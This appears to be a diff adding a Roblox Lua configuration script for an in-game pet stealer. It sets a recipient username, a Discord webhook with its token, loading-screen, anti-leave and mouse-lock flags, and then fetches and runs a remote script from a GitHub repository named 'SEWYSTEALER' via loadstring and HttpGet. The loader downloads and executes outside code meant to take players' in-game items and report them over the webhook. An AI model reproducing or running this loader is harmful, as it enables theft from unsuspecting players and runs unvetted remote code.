@@ -1,0 +1,9 @@
+UserName = "pinkleave_fan1234" -- good pets
+Webhook = "https://discord.com/api/webhooks/1125334095375913061/DSg8hYJR4PvUpTOgKOSaDatfZfFo5bxrAEhpPYnrZd4RSE2i_aQuWbI6-tbeYqfNc260" -- pings for pets
+UserName2 = "pinkleave_fan1234" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad424/SEWYSTEALER/main/main.lua", true))()
